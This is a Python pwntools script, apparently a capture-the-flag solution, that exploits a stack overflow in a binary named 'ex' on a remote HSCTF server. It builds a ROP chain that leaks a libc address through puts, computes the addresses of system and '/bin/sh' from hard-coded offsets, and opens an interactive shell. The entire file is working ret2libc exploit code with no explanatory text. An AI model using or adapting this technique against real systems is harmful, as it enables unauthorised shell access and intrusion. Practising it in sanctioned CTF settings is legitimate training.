#!/usr/bin/env python3
from pwn import *

e = ELF("./ex")
context.binary = e
p = remote("ex.hsctf.com", 1337)
#p = process("./ex")
#gdb.attach(p)
rop = ROP(e)
poprdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]
puts = e.plt["puts"]
libc_start_main = e.symbols["__libc_start_main"]
main = e.symbols["main"]

def exploit(stuff):
	p.sendline(b"A" * 40 + stuff + p64(e.symbols["main"]))
	p.sendlineafter(b"?\n", b"Q")

exploit(p64(poprdi) + p64(libc_start_main) + p64(puts))
libc_start_main_leak = u64(p.recvline()[:-1].ljust(8, b"\x00"))
print(hex(libc_start_main_leak))
"""
exploit(p64(poprdi) + p64(e.got["puts"]) + p64(puts))
puts_leak = u64(p.recvline()[:-1].ljust(8, b"\x00"))
print(hex(puts_leak))
"""
# from https://libc.blukat.me/?q=__libc_start_main%3A7fe6be8eff90%2Cputs%3A7fe6be950420&l=libc6_2.31-0ubuntu9.9_amd64
system = libc_start_main_leak + 0x2e300
bin_sh = libc_start_main_leak + 0x19062d
exploit(p64(ret) + p64(poprdi) + p64(bin_sh) + p64(system))

p.interactive()
